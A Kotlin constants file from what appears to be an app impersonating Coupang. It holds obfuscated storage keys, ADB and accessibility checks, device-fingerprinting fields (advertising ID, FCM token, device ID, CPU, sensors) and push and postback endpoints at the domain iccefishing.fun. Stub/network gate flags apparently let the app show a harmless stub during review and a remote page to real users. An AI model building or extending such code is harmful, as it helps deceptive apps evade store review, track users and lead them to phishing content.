package com.coupang.mobile.p.gray5


// STORAGE
val TINK_KEYSET = "r082gm88fud3"
val TINK_PREF_FILE = "qokcf76kmmdk"
val MASTER_KEY_URI = "so8j2n4muax5"
val FILE_NAME = "7p4u5x87bfwr"
val LINK_STORAGE_KEY = "ois0ki"
val STUB_STORAGE_KEY = "dj3s7y"
val STUB_STORAGE_VALUE_TRUE = "qm756x89"
val PUSH_STORAGE_KEY = "8tm2umdcdb"
val PUSH_STORAGE_VALUE_TRUE = "azgu0t"
val ONE_TIME_FLAG = "7eyh5g"
//val ADB_KEY = "wmsw094"

// App
val ADB = "adb_enabled"
val TRACKING_ID = "trackingId"

// Push
val PUSH_NOTIFICATION_API_URL = "iccefishing.fun/hpybwl7j1b/"
val PUSH_NOTIFICATION_API_GADID_KEY = "t1pqopns3h"
val PUSH_NOTIFICATION_API_FCM_TOKEN_KEY = "74zzuvdk71"

val POSTBACK_API_URL = "iccefishing.fun/5ggakpglw4/"
val POSTBACK_TRACKING_ID_KEY = "gyczf94baf"
val POSTBACK_FCM_TOKEN_KEY = "8dgbr2padz"

// URL
val BASE_URL = "iccefishing.fun/privacypolicy/"
val BASE_URL_STRICT = "iccefishing.fun"
val GADID_KEY = "1d2x1k0qkuwpf9"
val REF_KEY = "pco9rgry5byfnv"
val DEVICE_MODEL_KEY = "0r9pytiite7"
val FIRST_TIME_INSTALL_KEY = "yrllzqrqcv"
val PACKAGE_SOURCE_KEY = "thxdy3hkuo31xjulr"
val FIREBASE_INSTALL_ID = "1g7sbujwrxhpiaic"

val NETWORK_SECURITY_KEY = "avwq53xxuqqria"
val SENSORS_KEY = "fwwj89bdmj6csuonj"
val DEVICE_ID_KEY = "b7gfutqycnc5zpvy9"
val CPU_KEY = "tz8kvjrffdlb1ha8mg"
val BUILD_KEY = "thxdy3hkuo31xjulr"
val CHRG_UP_BRIGHT_KEY = "gqutxqeqpl8p1agz"
val INSTALL_A11Y_KEY = "aihg5yc636h"

val ADB_KEY = "74q93qhfzpchc59is9"



// --- Bitmask gate flags ---
val GATE_STUB = 0b001
val GATE_AD = 0b010
val GATE_NET = 0b100

// --- Router keys ---
val ROUTE_STUB = "s"
val ROUTE_NET = "n"

// --- Storage key derivation ---
fun k(seed: String) = seed.fold(0) { acc, c -> acc * 31 + c.code }.toString(16)
// k("lx5") → link storage key
// k("sx5") → stub storage key
// k("px5") → push storage key

